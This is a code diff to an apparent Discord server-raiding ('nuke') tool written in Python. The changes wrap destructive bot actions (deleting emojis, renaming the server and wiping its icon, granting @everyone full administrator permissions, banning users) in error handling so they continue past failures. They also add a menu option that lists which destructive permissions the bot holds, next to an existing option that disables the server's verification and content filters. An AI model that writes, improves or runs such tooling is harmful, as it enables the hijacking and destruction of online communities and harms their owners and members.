@@ -491,7 +491,10 @@ async def main(SERVER):
                         if toggleopts['deleteemojis'] == True:
                             print ("Deleting Emojis.")
                             for emoji in server.emojis:
-                                pool.add_task(removeemoji,server.id,emoji.id)
+                                try:
+                                    pool.add_task(removeemoji,server.id,emoji.id)
+                                except Exception as er:
+                                    print(er)
                             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
                         if toggleopts['senddm'] == True:
@@ -502,23 +505,35 @@ async def main(SERVER):
 
                         if toggleopts['namechange'] == True:
                             print('Changing server name...')
-                            await server.edit(name=str(toggleopts['servname']))
+                            try:
+                                await server.edit(name=str(toggleopts['servname']))
+                            except Exception as er:
+                                print(er)
 
                         if toggleopts['iconbegone'] == True:
                             print('Removing icon...')
-                            await server.edit(icon=None)
+                            try:
+                                await server.edit(icon=None)
+                            except Exception as er:
+                                print(er)
 
                         if toggleopts['changeicon'] == True:
                             print('Changing icon...')
                             with open(toggleopts['iconfile'], 'rb') as handle:
                                 icon = handle.read()
-                                await server.edit(icon=icon)
+                                try:
+                                    await server.edit(icon=icon)
+                                except Exception as er:
+                                    print(er)
 
                         if toggleopts['giveeveryoneadmin'] == True:
                             print('Giving everyone admin...')
                             for role in server.roles:
                                 if role.name == '@everyone':
-                                    await role.edit(permissions=Permissions.all())
+                                    try:
+                                        await role.edit(permissions=Permissions.all())
+                                    except Exception as er:
+                                        print(er)
                                     break
 
                         if toggleopts['userban'] == True:
@@ -770,6 +785,7 @@ async def main(SERVER):
             print(colored("1.  Move People in VC",menucolour))
             print(colored("2.  Mass Nickname Change",menucolour))
             print(colored("3.  Make server Raidable and insecure",menucolour))
+            print(colored("4.  Check Bot Permissions",menucolour))
             sel = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Selection: ')
             if int(sel) == 0:
                 await main(SERVER)
@@ -813,6 +829,30 @@ async def main(SERVER):
                 payload = {'default_message_notifications': 0,'explicit_content_filter': 0,'verification_level': 0}
                 requests.patch('https://discordapp.com/api/v6/guilds/'+str(server.id),headers=headers,json=payload)
                 (colored("Rules modified.",menucolour))
+                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
+                await main(SERVER)
+            elif int(sel) == 4:
+                clear()
+                for channel in server.channels:
+                    myperms = channel.permissions_for(server.get_member(client.user.id))
+                    if myperms.administrator:
+                        print("Administrator")
+                        break
+                    if myperms.ban_members:
+                        print("Ban Members")
+                    if myperms.manage_roles:
+                        print("Manage Roles")
+                    if myperms.manage_channels:
+                        print("Manage Channels")
+                    if myperms.manage_channels:
+                        print("Manage Guild")
+                    if myperms.mention_everyone:
+                        print("Mention Everyone")
+                    if myperms.manage_nicknames:
+                        print("Manage Nicknames")
+                    if myperms.move_members:
+                        print("Move Members")
+                    break
                 await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
                 await main(SERVER)
             else:
